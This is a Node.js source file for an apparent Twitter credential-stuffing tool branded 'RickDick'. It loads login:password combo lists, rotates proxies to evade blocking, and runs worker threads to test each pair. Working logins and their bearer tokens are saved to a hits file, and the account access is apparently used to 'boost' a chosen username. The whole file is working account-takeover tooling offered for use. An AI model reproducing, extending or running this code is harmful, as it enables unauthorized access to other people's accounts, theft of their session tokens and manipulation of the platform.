Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)];
}

Array.prototype.first = function (n = 1) {
    return this.slice(0, n)
}

String.prototype.isEmpty = function () {
    return (this.length === 0 || !this.trim());
};

const fs = require('fs');
const { Worker } = require('worker_threads')
const EventEmitter = require('events');
const path = require('path');
const ProxyAgent = require('proxy-agent');
const request = require('request');
const figlet = require("figlet");
const moment = require('moment');
const readline = require('readline');
const { default: fetch } = require('node-fetch');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
require('colors');
let config, proxies, threads = [];

const meta = {
    version: 0.1,
    started: false,
    startedAt: null,
    titleInterval: null
}

let data = {
    hit: 0,
    bad: 0,
    disabled: 0,
    challenge: 0,
    unknown: 0,
    timeout: 0,
    badline: 0
}

class LineManager {
    static parse(string) {
        return string.split("\r\n").filter(str => !str.isEmpty())
    }

    static parseLine(line) {
        return {
            login: line.split(":")[0],
            password: line.split(":")[1]
        }
    }
}

class CreditentialsManager {
    static save(type, creditential) {
        fs.appendFileSync(path.join(__dirname, 'results', type + ".txt"), `${creditential.login}:${creditential.password}${type === "hit" ? `:${creditential.token.replace('Bearer ', '')}` : ""}\n`)
    }
}

class ThreadManager extends EventEmitter {
    constructor(threads) {
        super();
        this.waiting = [];
        this.threads = threads

        this.on('free', () => {
            if (this.waiting.length > 0) this.waiting.shift()()
        });
    }

    start() {
        for (let i = 0; i < this.threads; i++) {
            this.emit('free');
        }
    }

    register(cb) {
        this.waiting.push(cb)
    }
}

async function init() {
    try {
        config = require('./config.json');
    } catch (err) {
        await request('https://raw.githubusercontent.com/lacry147/Assets/main/config.default.json', async (error, response, body) => {
            if (error) throw Error('Cannot get default configuration.')
            fs.writeFileSync(path.join(__dirname, 'config.json'), body, 'utf-8');
        });
    }

    if (config['UseProxy']) {
        try {
            proxies = LineManager.parse(fs.readFileSync(path.join(__dirname, config['ProxyPath']), 'utf-8'))
        } catch (error) {
            throw Error("The specified path could not be found. (Set 'UseProxy' to false)")
        }
    }

    if (!fs.existsSync(path.join(__dirname, 'results'))) {
        fs.mkdirSync(path.join(__dirname, 'results'))
    }

    if (!fs.existsSync(path.join(__dirname, 'results', 'hit.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'hit.txt'), '');
    }

    if (config['Options']['SaveBad'] && !fs.existsSync(path.join(__dirname, 'results', 'bad.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'bad.txt'), '');
    }

    if (config['Options']['SaveChallenge'] && !fs.existsSync(path.join(__dirname, 'results', 'challenge.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'challenge.txt'), '');
    }

    if (config['Options']['SaveDisabled'] && !fs.existsSync(path.join(__dirname, 'results', 'disabled.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'disabled.txt'), '');
    }

    if (config['Options']['SaveTimeout'] && !fs.existsSync(path.join(__dirname, 'results', 'timeout.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'timeout.txt'), '');
    }

    if (config['Options']['SaveUnknown'] && !fs.existsSync(path.join(__dirname, 'results', 'unknown.txt'))) {
        fs.writeFileSync(path.join(__dirname, 'results', 'unknown.txt'), '');
    }
}

function sum(obj) {
    return Object.keys(obj).reduce((sum, key) => sum + parseFloat(obj[key] || 0), 0);
}

async function check() {
    return new Promise(async (resolve, reject) => {
        init().then(async () => {
            const username = await new Promise(async (resolve, reject) => rl.question('User name of the account you want to boost: ', resolve))
            const combo = LineManager.parse(fs.readFileSync(config['ComboPath'], 'utf-8'));
            const manager = new ThreadManager(config['Threads']);

            async function spawnThread(workerData) {
                return new Promise((resolve, reject) => {
                    const worker = new Worker('./check.js', { workerData });
                    worker.on('message', (msg) => {
                        manager.emit('free')
                        resolve(msg)
                    });
                    worker.on('error', reject);
                    worker.on('exit', code => {
                        code !== 0 && reject(new Error(`Worker stopped with exit code ${code}`))
                    });
                })
            }

            meta.titleInterval = setInterval(() => process.title = `💉・RickDick Twitter Tools v${meta.version} | Hit: ${data.hit} - Bad: ${data.bad} | Total: ${sum(data)} - Remaining: ${combo.length - sum(data)}`, 1)

            console.log(`Starting ${config['Threads']} thread${config['Threads'] > 1 ? 's' : ''}...`)

            for (let i = 0; i < combo.length; i++) {
                const creditential = LineManager.parseLine(combo[i])
                if (!creditential.login || !creditential.password) {
                    Logger.badline(combo[i])
                    data.badline++;
                    continue;
                }

                manager.register(async () => {
                    let proxy, ip;

                    if (config['UseProxy']) {
                        proxy = proxies.random();

                        ip = await fetch('https://api64.ipify.org?format=raw', {
                            agent: ProxyAgent(config['ProxyType'] + "://" + proxy)
                        }).then(async (res) => await res.text())
                    }
                    spawnThread({
                        creditential,
                        proxy: proxy ? config['ProxyType'] + "://" + proxy : null,
                        options: {
                            navigationTimeout: config['Timeout']
                        },
                        username
                    }).then(async (res) => {
                        switch (res.type) {
                            case 'hit': {
                                data.hit++;
                                Logger.hit(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``}`)
                                CreditentialsManager.save('hit', res)
                                break;
                            }
                            case 'bad': {
                                data.bad++;
                                Logger.bad(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``}`)
                                if (config['Options']['SaveBad']) CreditentialsManager.save('bad', res)
                                break;
                            }
                            case 'disabled': {
                                data.disabled++;
                                Logger.disabled(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``}`)
                                if (config['Options']['SaveDisabled']) CreditentialsManager.save('disabled', res)
                                break;
                            }
                            case 'challenge': {
                                data.challenge++;
                                Logger.challenge(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``}`)
                                if (config['Options']['SaveChallenge']) CreditentialsManager.save('challenge', res)
                                break;
                            }
                            case 'timeout': {
                                data.timeout++;
                                Logger.timeout(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``} (${config['Timeout']})`)
                                if (config['Options']['SaveTimeout']) CreditentialsManager.save('timeout', res)
                                break;
                            }
                            default: {
                                data.unknown++;
                                Logger.unknown(`${res.login}:${res.password} ${res.proxy ? `| ${String(ip).grey}` : ``}`)
                                if (config['Options']['SaveUnknown']) CreditentialsManager.save('unknown', res)

                            }
                        }
                    })
                })
                if (combo.length - 1 === i) {
                    manager.start();
                }
            }

            console.log(`All threads have been started...`)
            console.log(`Starting checking accounts`)

            while (combo.length === sum(data)) {
                return resolve('end')
            }
        });
    })
}

class Logger {
    static getLogHeader() {
        return ("[" + moment(Date.now()).format("YYYY-MM-DD HH:mm:ss") + "]").grey
    }

    static hit(text) {
        console.log(`${Logger.getLogHeader()} ${"[HIT]".green} Hidden Hit bcz its my own acc`)
    }

    static bad(text) {
        console.log(`${Logger.getLogHeader()} ${"[BAD]".red} ${text}`)
    }

    static challenge(text) {
        console.log(`${Logger.getLogHeader()} ${"[CHALLENGE]".yellow} ${text}`)
    }

    static disabled(text) {
        console.log(`${Logger.getLogHeader()} ${"[DISABLED]".blue} ${text}`)
    }

    static unknown(text) {
        console.log(`${Logger.getLogHeader()} ${"[UNKNOWN]".grey} ${text}`)
    }

    static timeout(text) {
        console.log(`${Logger.getLogHeader()} ${"[TIMEOUT]".grey} ${text}`)
    }

    static badline(text) {
        console.log(`${Logger.getLogHeader()} ${"[BADLINE]".brightRed} "${text}"`)
    }
}

function clear() {
    process.stdout.write('\x1B[2J\x1B[3J\x1B[H\x1Bc');
}

function showFiglet(mode) {
    console.log(`${(figlet.textSync(`RickDick`)).red} v${meta.version} by lilstool ${mode ? `\n           Mode: ${mode}` : ``}\n`);
}

function showAlertMessage() {
    console.log(`${(`[!] Please remember to configure your settings (config.json) file before using RickDick`).red}`);
}

function setTitle() {
    process.title = `・RickDick-${meta.version} | by D0wzy`
}

function keypress() {
    process.stdin.setRawMode(true)
    return new Promise(resolve => process.stdin.once('data', () => {
        process.stdin.setRawMode(false)
        resolve()
    }))
}

async function showMenu() {
    clear();
    showFiglet();

    console.log(`${('» Select your mode:')}
[${("1").red}] - Check & Bot`);

    rl.question('> ', async (answer) => {
        if (parseInt(answer) === 1) {
            clear();
            showFiglet('Check Accounts');
            meta.started = true;
            meta.startedAt = Date.now();

            check().then(async () => {
                meta.started = false
                meta.startedAt = null
                clearInterval(meta.titleInterval)
                data = {
                    hit: 0,
                    bad: 0,
                    disabled: 0,
                    challenge: 0,
                    unknown: 0,
                    timeout: 0,
                    badline: 0
                }

                console.log(`Checking completed ! Press any key to return to menu`);
                await keypress().then(showMenu)
            })
            return
        } else if (parseInt(answer) === 2) {
            clear();
            showFiglet('Bot Account');
            meta.started = true;
            meta.startedAt = Date.now();

            check().then(async () => {
                meta.started = false
                meta.startedAt = null
                clearInterval(meta.titleInterval)
                data = {
                    hit: 0,
                    bad: 0,
                    disabled: 0,
                    challenge: 0,
                    unknown: 0,
                    timeout: 0,
                    badline: 0
                }

                console.log(`Checking completed ! Press any key to return to menu`);
                await keypress().then(showMenu)
            })
            return
        } else {
            showMenu();
        }
        rl.close();
    })


}

readline.emitKeypressEvents(process.stdin);
setTitle()
showMenu();